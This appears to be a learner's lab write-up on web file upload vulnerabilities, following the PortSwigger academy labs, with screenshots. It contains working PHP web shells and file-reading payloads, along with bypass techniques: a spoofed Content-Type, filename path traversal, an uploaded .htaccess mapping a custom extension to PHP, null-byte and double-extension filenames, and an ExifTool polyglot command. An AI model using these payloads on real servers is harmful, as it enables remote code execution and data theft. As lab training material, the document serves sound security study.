## What are file upload vulnerabilities:

File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. Failing to properly enforce restrictions on these could mean that even a basic image upload function can be used to upload arbitrary and potentially dangerous files instead. This could even include server-side script files that enable remote code execution.

In some cases, the act of uploading the file is in itself enough to cause damage. Other attacks may involve a follow-up HTTP request for the file, typically to trigger its execution by the server.

--- 

## What is the impact of file upload vulnerability:

The impact of file upload vulnerabilities generally depends on two key factors:

- Which aspect of the file the website fails to validate properly, whether that be its size, type, contents, and so on.
- What restrictions are imposed on the file once it has been successfully uploaded.

In the worst case scenario, the file's type isn't validated properly, and the server configuration allows certain types of file (such as `.php` and `.jsp`) to be executed as code. In this case, an attacker could potentially upload a server-side code file that functions as a web shell, effectively granting them full control over the server.

If the filename isn't validated properly, this could allow an attacker to overwrite critical files simply by uploading a file with the same name. If the server is also vulnerable to directory traversal, this could mean attackers are even able to upload files to unanticipated locations.

Failing to make sure that the size of the file falls within expected thresholds could also enable a form of denial-of-service (DoS) attack, whereby the attacker fills the available disk space.

---

## How do file upload vulnerability arise:

Given the fairly obvious dangers, it's rare for websites in the wild to have no restrictions whatsoever on which files users are allowed to upload. More commonly, developers implement what they believe to be robust validation that is either inherently flawed or can be easily bypassed.

For example, they may attempt to blacklist dangerous file types, but fail to account for parsing discrepancies when checking the file extensions. As with any blacklist, it's also easy to accidentally omit more obscure file types that may still be dangerous.

In other cases, the website may attempt to check the file type by verifying properties that can be easily manipulated by an attacker using tools like Burp Proxy or Repeater or caido replay and proxy.

Ultimately, even robust validation measures may be applied inconsistently across the network of hosts and directories that form the website, resulting in discrepancies that can be exploited.

--- 

## How web servers handle requests for static file:

The process for handling these static files is still largely the same. At some point, the server parses the path in the request to identify the file extension. It then uses this to determine the type of the file being requested, typically by comparing it to a list of preconfigured mappings between extensions and MIME types. What happens next depends on the file type and the server's configuration.

- If this file type is non-executable, such as an image or a static HTML page, the server may just send the file's contents to the client in an HTTP response.
- If the file type is executable, such as a PHP file, **and** the server is configured to execute files of this type, it will assign variables based on the headers and parameters in the HTTP request before running the script. The resulting output may then be sent to the client in an HTTP response.
- If the file type is executable, but the server **is not** configured to execute files of this type, it will generally respond with an error. However, in some cases, the contents of the file may still be served to the client as plain text. Such misconfigurations can occasionally be exploited to leak source code and other sensitive information. You can see an example of this in our information disclosure learning materials.# Starting phase

Before we look at how to exploit file upload vulnerabilities, it's important that you have a basic understanding of how servers handle requests for static files.

Historically, websites consisted almost entirely of static files that would be served to users when requested. As a result, the path of each request could be mapped 1:1 with the hierarchy of directories and files on the server's filesystem. Nowadays, websites are increasingly dynamic and the path of a request often has no direct relationship to the filesystem at all. Nevertheless, web servers still deal with requests for some static files, including stylesheets, images, and so on.

The process for handling these static files is still largely the same. At some point, the server parses the path in the request to identify the file extension. It then uses this to determine the type of the file being requested, typically by comparing it to a list of preconfigured mappings between extensions and MIME types. What happens next depends on the file type and the server's configuration.

- If this file type is non-executable, such as an image or a static HTML page, the server may just send the file's contents to the client in an HTTP response.
- If the file type is executable, such as a PHP file, **and** the server is configured to execute files of this type, it will assign variables based on the headers and parameters in the HTTP request before running the script. The resulting output may then be sent to the client in an HTTP response.
- If the file type is executable, but the server **is not** configured to execute files of this type, it will generally respond with an error. However, in some cases, the contents of the file may still be served to the client as plain text. Such misconfigurations can occasionally be exploited to leak source code and other sensitive information. You can see an example of this in our information disclosure learning materials.
## TIP: 

The `Content-Type` response header may provide clues as to what kind of file the server thinks it has served. If this header hasn't been explicitly set by the application code, it normally contains the result of the file extension/MIME type mapping.

--- 

## Exploiting unrestricted file upload vulnerability:

From a security perspective, the worst possible scenario is when a website allows you to upload server-side scripts, such as PHP, Java, or Python files, and is also configured to execute them as code. This makes it trivial to create your own web shell on the server.

#### Web shell

A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint.

If you're able to successfully upload a web shell, you effectively have full control over the server. This means you can read and write arbitrary files, exfiltrate sensitive data, even use the server to pivot attacks against both internal infrastructure and other servers outside the network. For example, the following PHP one-liner could be used to read arbitrary files from the server's filesystem:

`<?php echo file_get_contents('/path/to/target/file'); ?>`

Once uploaded, sending a request for this malicious file will return the target file's contents in the response.

A more versatile web shell may look something like this:

`<?php echo system($_GET['command']); ?>`

This script enables you to pass an arbitrary system command via a query parameter as follows:

`GET /example/exploit.php?command=id HTTP/1.1`

---

## One simple process: 

1. While proxying traffic through Burp or caido, log in to your account and notice the option for uploading an avatar image.
2. Upload an arbitrary image, then return to your account page. Notice that a preview of your avatar is now displayed on the page.
3. In Burp or caido, go to **Proxy > HTTP history**. Click the filter bar to open the **HTTP history filter** window. Under **Filter by MIME type**, enable the **Images** checkbox, then apply your changes. (By default in caido that image is also enabled)
4. In the proxy history, notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater or caido replay.
5. On your system, create a file called `exploit.php`, containing a script for fetching the contents of Carlos's secret file. For example:
    
    `<?php echo file_get_contents('/etc/passwd'); ?>`
6. Use the avatar upload function to upload your malicious PHP file. The message in the response confirms that this was uploaded successfully.
7. In Burp Repeater or caido replay, change the path of the request to point to your PHP file:
    
    `GET /files/avatars/exploit.php HTTP/1.1`
8. Send the request. Notice that the server has executed your script and returned its output (command output) in the response.

--- 

## Exploiting flawed validation of file uploads

In the wild, it's unlikely that you'll find a website that has no protection against file upload attacks like we saw in the previous technique. But just because defenses are in place, that doesn't mean that they're robust. You can sometimes still exploit flaws in these mechanisms to obtain a web shell for remote code execution.

--- 

## Flawed file type validation

When submitting HTML forms, the browser typically sends the provided data in a `POST` request with the content type `application/x-www-form-urlencoded`. This is fine for sending simple text like your name or address. However, it isn't suitable for sending large amounts of binary data, such as an entire image file or a PDF document. In this case, the content type `multipart/form-data` is preferred.

--- 

## Flawed file type validation - Continued

Consider a form containing fields for uploading an image, providing a description of it, and entering your username. Submitting such a form might result in a request that looks something like this:
```
POST /images HTTP/1.1 Host: normal-website.com 
Content-Length: 12345 
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456 ---------------------------012345678901234567890123456 
Content-Disposition: form-data; name="image"; filename="example.jpg" 
Content-Type: image/jpeg [...binary content of example.jpg...] 
---------------------------012345678901234567890123456 Content-Disposition: form-data; 
name="description" This is an interesting description of my image. 
---------------------------012345678901234567890123456 Content-Disposition: form-data; 
name="username" wiener 
---------------------------012345678901234567890123456--
```

As you can see, the message body is split into separate parts for each of the form's inputs. Each part contains a `Content-Disposition` header, which provides some basic information about the input field it relates to. These individual parts may also contain their own `Content-Type` header, which tells the server the MIME type of the data that was submitted using this input.

---

## Flawed file type validation - Continued

One way that websites may attempt to validate file uploads is to check that this input-specific `Content-Type` header matches an expected MIME type. If the server is only expecting image files, for example, it may only allow types like `image/jpeg` and `image/png`. Problems can arise when the value of this header is implicitly trusted by the server. If no further validation is performed to check whether the contents of the file actually match the supposed MIME type, this defense can be easily bypassed using tools like Burp Repeater or caido replay.

---

## Process Steps:

- Log in and upload an image as your avatar, then go back to your account page.
- In Burp or caido, go to **Proxy > HTTP history** and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater.
- On your system, create a file called `exploit.php`, containing a script for fetching the contents of Carlos's secret. For example:
    
    `<?php echo file_get_contents('/etc/passwd'); ?>`
- Attempt to upload this script as your avatar. The response indicates that you are only allowed to upload files with the MIME type `image/jpeg` or `image/png`.
- In Burp or caido, go back to the proxy history and find the `POST /my-account/avatar` request that was used to submit the file upload. Send this to Burp Repeater.
- In Burp Repeater or caido replay, go to the tab containing the `POST /my-account/avatar` request. In the part of the message body related to your file, change the specified `Content-Type` to `image/jpeg`.
- Send the request. Observe that the response indicates that your file was successfully uploaded.
- Switch to the other Repeater tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the name of your image file with `exploit.php` and send the request. Observe that command's output was returned in the response.

--- 

## In simple way...

1. At first login to the account -> then create a payload of that script (basic exploit) "<?php echo system($_GET['cmd']); ?>"
2. Then upload to the uploadable function ->  then that shows and error -> go to burpsuite or caido **http-history** There you can see the `POST` method where the file uploaded 
3. Send that to repeter and then just change the function to uploadable file like `image` or anything by changing the `x-php` function like the given image.
<img width="1529" height="1005" alt="Screenshot_20260111_234300" src="https://github.com/user-attachments/assets/ee7e4848-08c1-408a-94d3-8ef38e499bd0" />
4. Then just go back to the website and check the avater image or image viewable function and click to open and execute that in other tab -> there you can see that your exploit name is appearing.
<img width="1190" height="912" alt="Screenshot_20260111_234332" src="https://github.com/user-attachments/assets/25fb52e6-d6cf-4c4e-9f9e-ebee5593355c" />

<img width="938" height="244" alt="Screenshot_20260111_234316" src="https://github.com/user-attachments/assets/75687076-d4e9-4530-aa9a-e3b84d5180a5" />

5. Now add `?cmd=ls` to test that is your function is working or not. if it is then just go back yo buirpsuite or caido and then go to `http-history` and find that `cmd=ls` **http-history** then send it to repeter or replay.
<img width="1536" height="1039" alt="Screenshot_20260111_234240" src="https://github.com/user-attachments/assets/a9e80cab-4f20-4c3b-849c-b4cda113f139" />
6. Then you can able to execute any type of arbitary command what you want. You got an access of that server.

--- 

## Preventing file execution in user-accessible directories

While it's clearly better to prevent dangerous file types being uploaded in the first place, the second line of defense is to stop the server from executing any scripts that do slip through the net.

As a precaution, servers generally only run scripts whose MIME type they have been explicitly configured to execute. Otherwise, they may just return some kind of error message or, in some cases, serve the contents of the file as plain text instead:
```
GET /static/exploit.php?command=id HTTP/1.1
    Host: normal-website.com


    HTTP/1.1 200 OK
    Content-Type: text/plain
    Content-Length: 39

    <?php echo system($_GET['command']); ?> 
```

---

## Continued
 This behavior is potentially interesting in its own right, as it may provide a way to leak source code, but it nullifies any attempt to create a web shell.

This kind of configuration often differs between directories. A directory to which user-supplied files are uploaded will likely have much stricter controls than other locations on the filesystem that are assumed to be out of reach for end users. If you can find a way to upload a script to a different directory that's not supposed to contain user-supplied files, the server may execute your script after all.
### Tip

Web servers often use the `filename` field in `multipart/form-data` requests to determine the name and location where the file should be saved.

You should also note that even though you may send all of your requests to the same domain name, this often points to a reverse proxy server of some kind, such as a load balancer. Your requests will often be handled by additional servers behind the scenes, which may also be configured differently. 

--- 

## Process

1. Log in and upload an image as your avatar, then go back to your account page.
2. In Burp, go to `Proxy > HTTP` history and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater or caido replay.
3.  On your system, create a file called exploit.php, containing a script for fetching the contents of Carlos's secret. For example:
```PHP
i. <?php echo file_get_contents('/home/carlos/secret'); ?>
    or
ii. <?php system($_GET['cmd']);?>
```
4. Upload this script as your avatar. Notice that the website doesn't seem to prevent you from uploading PHP files.
<h2>AFTER UPLOAD</h2>
<img width="1606" height="963" alt="Screenshot_20260118_124927" src="https://github.com/user-attachments/assets/238a90d3-0b0f-463b-9129-46156baf9c27" />

5. In Burp Repeater or caido replay, go to the tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the name of your image file with `exploit.php` and send the request. Observe that instead of executing the script and returning the output, the server has just returned the contents of the PHP file as plain text.
6. In Burp's or caido's proxy history, find the `POST /my-account/avatar` request that was used to submit the file upload and send it to Burp Repeater or caido replay.
<h2>PROXY HISTORY</h2>
<img width="1920" height="1046" alt="Screenshot_20260118_131456" src="https://github.com/user-attachments/assets/60d56709-011b-4a84-b31f-6bf8fa59efb7" />

7. In Burp Repeater or caido replay, go to the tab containing the `POST /my-account/avatar` request and find the part of the request body that relates to your PHP file. In the Content-Disposition header, change the filename to include a directory traversal sequence:
    ```WEB
    Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
    ```
8. Send the request. Notice that the response says The `file avatars/exploit.php` has been uploaded. This suggests that the server is stripping the directory traversal sequence from the file name.
<h2>BEFORE PATHTRIVARSAL</h2>
    <img width="1531" height="974" alt="Screenshot_20260118_125257" src="https://github.com/user-attachments/assets/aa0c64f5-dae2-4aff-8616-43770a2fde8f" />

9. Obfuscate the directory traversal sequence by URL encoding the forward slash (`/`) character, resulting in:
```WEB
   filename="..%2fexploit.php" or "%2e%2e%2fexploit.php".
```
<h2>AFTER PATHTRIVARSAL</h2>
<img width="1530" height="992" alt="Screenshot_20260118_125225" src="https://github.com/user-attachments/assets/284d9bcd-20ee-4a15-9bac-dad29ab03312" />

<h2>OPEN IMAGE TO NEW TAB</h2>
<img width="1636" height="1049" alt="Screenshot_20260118_125006" src="https://github.com/user-attachments/assets/f4b0fa9d-9f7f-4c12-924b-fee316dc2cdb" />

<h2>FOR 2ND EXPLOIT</h2>
<img width="872" height="375" alt="Screenshot_20260118_125052" src="https://github.com/user-attachments/assets/4645de0d-cc51-478c-85a9-d74205fc0deb" />

- Just remove the `/avatars/..%2f` that file will now ready to go.....

<h2>NOW CMD PLAY COMES IN</h2>
<img width="1751" height="460" alt="Screenshot_20260118_125149" src="https://github.com/user-attachments/assets/0bdb3066-1743-4f51-bfbc-dd2dfd906344" />

- Now just add `?cmd=<command>` you are just exploited the website using path-trivarsal & file upload vuln....

10. Send the request and observe that the message now says The `file avatars/../exploit.php` has been uploaded. This indicates that the file name is being URL decoded by the server. In the browser, go back to your account page.
11. In Burp's or caido's proxy history, find the `GET /files/avatars/..%2fexploit.php` request. Observe that Carlos's secret was returned in the response or you can retrive by 2nd exploit by executing own commands on webpage. This indicates that the file was uploaded to a higher directory in the filesystem hierarchy (`/files`), and subsequently executed by the server. Note that this means you can also request this file using `GET /files/exploit.php`.

<img width="1022" height="300" alt="Screenshot_20260118_124840" src="https://github.com/user-attachments/assets/3b19d156-5245-490c-b6be-28eea308c4df" />

12. Submit the secret to solve the lab.

---

## Insufficient blacklisting of dangerous file types

One of the more obvious ways of preventing users from uploading malicious scripts is to blacklist potentially dangerous file extensions like `.php`. The practice of blacklisting is inherently flawed as it's difficult to explicitly block every possible file extension that could be used to execute code. Such blacklists can sometimes be bypassed by using lesser known, alternative file extensions that may still be executable, such as `.php5`, `.shtml`, and so on.

--- 

## Overriding the server configuration

As we discussed in the previous section, servers typically won't execute files unless they have been configured to do so. For example, before an Apache server will execute PHP files requested by a client, developers might have to add the following directives to their `/etc/apache2/apache2.conf` file:

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so 
AddType application/x-httpd-php .php
```

Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings. Apache servers, for example, will load a directory-specific configuration from a file called `.htaccess` if one is present.

Similarly, developers can make directory-specific configuration on IIS servers using a `web.config` file. This might include directives such as the following, which in this case allows JSON files to be served to users:

```
<staticContent> 
	<mimeMap fileExtension=".json" mimeType="application/json" /> </staticContent>
```
Web servers use these kinds of configuration files when present, but you're not normally allowed to access them using HTTP requests. However, you may occasionally find servers that fail to stop you from uploading your own malicious configuration file. In this case, even if the file extension you need is blacklisted, you may be able to trick the server into mapping an arbitrary, custom file extension to an executable MIME type.

---

## Process.......

1.  Log in and upload an image as your avatar, then go back to your account page. In Burp or ciado, go to `Proxy > HTTP` history and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater or caido replay.

2. On your system, create a file called **exploit.php** containing a script for fetching the contents of Carlos's secret. For example:

```PHP
    <?php echo file_get_contents('/home/carlos/secret'); ?>
```

3. Attempt to upload this script as your **avatar**. The response indicates that you are not allowed to upload files with a `.php` extension.
4. In Burp's or caido's proxy history, find the **POST** `/my-account/avatar` request that was used to submit the file upload. In the response, notice that the headers reveal that you're talking to an **Apache server**. Send this request to Burp Repeater or caido replay.
5. In Burp Repeater or ciado replay, go to the tab for the **POST** `/my-account/avatar request` and find the part of the body that relates to your `PHP file`. Make the following changes:

    1. Change the value of the `filename` parameter to `.htaccess`.
    2. Change the value of the `Content-Type` header to `text/plain`.

    3. Replace the contents of the file (your PHP payload) with the following Apache directive: `AddType application/x-httpd-php .l33t`

    4. This maps an arbitrary extension (`.l33t`) to the executable MIME type `application/x-httpd-php`. As the server uses the `mod_php` module, it knows how to handle this already.
	
6. Send the request and observe that the file was successfully uploaded.
	<h2 align="center"> APACHE CONFIG CHANGE</h2>
	<img width="1919" height="1048" alt="image" src="https://github.com/user-attachments/assets/841e88e7-2f4d-45c8-8f44-6029a9f6cc67" />

7. Use the back arrow in Burp Repeater or ciado replay to return to the original request for uploading your **PHP exploit**.
8. Change the value of the **filename parameter** from `exploit.php` to `exploit.l33t` or what extension name you give it `<.name>`. Send the request again and notice that the file was uploaded successfully.
	
	<h2 align="center"> THEN PHP FILE UPLOAD </h2>
	<img width="1920" height="1048" alt="image" src="https://github.com/user-attachments/assets/0c59cab8-af59-4a4d-a6ea-3d145cd59872" />
	
	<h2 align="center"> or </h2>
	<img width="764" height="929" alt="image" src="https://github.com/user-attachments/assets/9265044f-9ead-4aeb-985d-bf107b86f8f2" />

9. Switch to the other Repeater or replay tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the name of your image file with `exploit.l33t` and send the request. Observe that **Carlos's secret** was returned in the response. Thanks to our malicious `.htaccess` file, the `.l33t` file was executed as if it were a `.php` file. 
	<h2 align="center"> HERE WE GO</h2>
	<img width="760" height="613" alt="image" src="https://github.com/user-attachments/assets/5cafa5d7-ed7b-48ce-a082-033302cf1b08" />

---

## Obfuscating file extensions

- Even the most exhaustive blacklists can potentially be bypassed using classic obfuscation techniques. Let's say the validation code is case sensitive and fails to recognize that exploit.pHp is in fact a .php file. If the code that subsequently maps the file extension to a MIME type is not case sensitive, this discrepancy allows you to sneak malicious PHP files past validation that may eventually be executed by the server.

- You can also achieve similar results using the following techniques:

	1. Provide multiple extensions. Depending on the algorithm used to parse the filename, the following file may be interpreted as either a `PHP` file or `JPG image`: `exploit.php.jpg` Add trailing characters.
 	2. Some components will strip or ignore trailing whitespaces, dots, and suchlike: `exploit.php.`
  	3. Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: `exploit%2Ephp`
  	4. Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like **PHP** or **Java**, but the server processes the file using lower-level functions in **C/C++**, for example, this can cause discrepancies in what is treated as the end of the filename: `exploit.asp;.jpg` or `exploit.asp%00.jpg`
  	5. Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like xC0 x2E, xC4 xAE or xC0 xAE may be translated to x2E if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.

--- 

## Obfuscating file extensions - Continued

- Other defenses involve stripping or replacing dangerous extensions to prevent the file from being executed. If this transformation isn't applied recursively, you can position the prohibited string in such a way that removing it still leaves behind a valid file extension. For example, consider what happens if you strip .php from the following filename:

```PHP
	exploit.p.phphp
```
This is just a small selection of the many ways it's possible to obfuscate file extensions.

--- 

## PROCESS

1. Log in and upload an image as your avatar, then go back to your account page.
2. In Burp or caido, go to `Proxy > HTTP history` and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater  or caido replay.

<h2 align="center">PROXY-HISTORY</h2>
<img width="1920" height="1048" alt="Screenshot_20260208_232550" src="https://github.com/user-attachments/assets/8ed4c0ff-6c11-4371-bc9b-34dc17fbb279" align="center" />

3. On your system, create a file called `exploit.php`, containing a script for fetching the contents of Carlos's secret. For example:
```PHP
	<?php echo file_get_contents('/home/carlos/secret'); ?>
					OR
	<?php system ($_GET['cmd']); ?>
```
4. Attempt to upload this script as your avatar. The response indicates that you are only allowed to upload `JPG` and `PNG` files.
5. In Burp's or caido's proxy history, find the `POST /my-account/avatar` request that was used to submit the file upload. Send this to Burp Repeater or caido replay.
6. In Burp Repeater or caido replay, go to the tab for the `POST /my-account/avatar` request and find the part of the body that relates to your `PHP` file. In the Content-Disposition header, change the value of the filename parameter to include a URL encoded null byte, followed by the `.jpg` extension:
```FILENAME-CHANGING
	filename="exploit.php%00.jpg"
```

<h2 align="center">AFTER FILE NAME CHANGE</h2>
<img width="1537" height="980" alt="Screenshot_20260208_232536" src="https://github.com/user-attachments/assets/f7c6d9f4-86e4-4fa2-92a9-6b7511979d02" align="center" />

7. Send the request and observe that the file was **successfully** uploaded. Notice that the message refers to the file as `exploit.php`, suggesting that the null byte and `.jpg` extension have been **stripped**

<h2 align="center">AFTER SUCCESSFULLY UPLOAD F5 ON WEB</h2>
<img width="1920" height="1046" alt="Screenshot_20260208_232355" src="https://github.com/user-attachments/assets/8195a235-15aa-4a8c-9df3-733257353a8b" align="center" />

<h2 align="center">FOR 2ND PAYLOAD OPEN IN A NEW TAB</h2>
<img width="1920" height="1045" alt="Screenshot_20260208_232452" src="https://github.com/user-attachments/assets/d2769d16-051a-46a9-868c-98bc8b991d72" align="center" />

<h2 align="center">NOW JUST CHECK WHAT IT GIVING</h2>
<img width="861" height="305" alt="Screenshot_20260208_232432" src="https://github.com/user-attachments/assets/0b6ddd47-e908-422e-bb0e-d59f76ba9d56" align="center" />

<h2 align="center">NOW JUST ADD `?cmd=<command>` AND SEE RESULT</h2>
<img width="901" height="329" alt="Screenshot_20260208_232411" src="https://github.com/user-attachments/assets/1081dae6-8813-467d-a8a2-57e9fc3daa12" align="center" />

8. Switch to the other Repeater tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the name of your image file with `exploit.php` and send the request. Observe that Carlos's secret was returned in the response.

<h2 align=center>FINAL STAGE</h2>
<img width="1538" height="984" alt="Screenshot_20260208_232514" src="https://github.com/user-attachments/assets/360b3040-4dd2-4719-83e2-68a708d82353" align="center" />

9. Submit the secret to solve the lab.

--- 
## Flawed validation of the file's contents

Instead of implicitly trusting the `Content-Type` specified in a request, more secure servers try to verify that the contents of the file actually match what is expected.

In the case of an image upload function, the server might try to verify certain intrinsic properties of an image, such as its dimensions. If you try uploading a PHP script, for example, it won't have any dimensions at all. Therefore, the server can deduce that it can't possibly be an image, and reject the upload accordingly.

## Flawed validation of the file's contents - Continued

Similarly, certain file types may always contain a specific sequence of bytes in their header or footer. These can be used like a fingerprint or signature to determine whether the contents match the expected type. For example, JPEG files always begin with the bytes `FF D8 FF`.

This is a much more robust way of validating the file type, but even this isn't foolproof. Using special tools, such as **ExifTool**, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata.

## Process 

1. On your system, create a file called `exploit.php` containing a script for fetching the contents of Carlos's secret. For example:
    
    ```PHP
    <?php echo file_get_contents('/home/carlos/secret'); ?>
    ```
1. Log in and attempt to upload the script as your avatar. Observe that the server successfully blocks you from uploading files that aren't images, even if you try using some of the techniques you've learned in previous labs.
2. Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows:
    
    ```BASH
    exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
    ```
    <h2 align="center">TO DO</h2>
	<img width="1378" height="261" alt="image" src="https://github.com/user-attachments/assets/4e1dedf6-2850-4114-8a0f-658ee43477b1" align="center"/>

    This adds your PHP payload to the image's `Comment` field, then saves the image with a `.php` extension.

   <h2 align="center">THE THING</h2>
   <img width="1353" height="922" alt="image" src="https://github.com/user-attachments/assets/dda14fa0-0b0a-4359-94c4-ea4c60666637" align="center"/>

4. In the browser, upload the polyglot image as your avatar, then go back to your account page.
5. In Burp's or caido's proxy history, find the `GET /files/avatars/polyglot.php` request. Use the message editor's search feature to find the `START` string somewhere within the binary image data in the response. Between this and the `END` string, you should see Carlos's secret, for example:
    
    ```WEB
    START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END
    ```
    <h2 align="center">HERE YOU GO</h2>
	<img width="1920" height="1044" alt="image" src="https://github.com/user-attachments/assets/76bfc63d-7e5a-4760-b02d-49ccf1b0e7c5" align="center"/>

6. Submit the secret to solve the lab.

--- 

> To Be Continuee...........
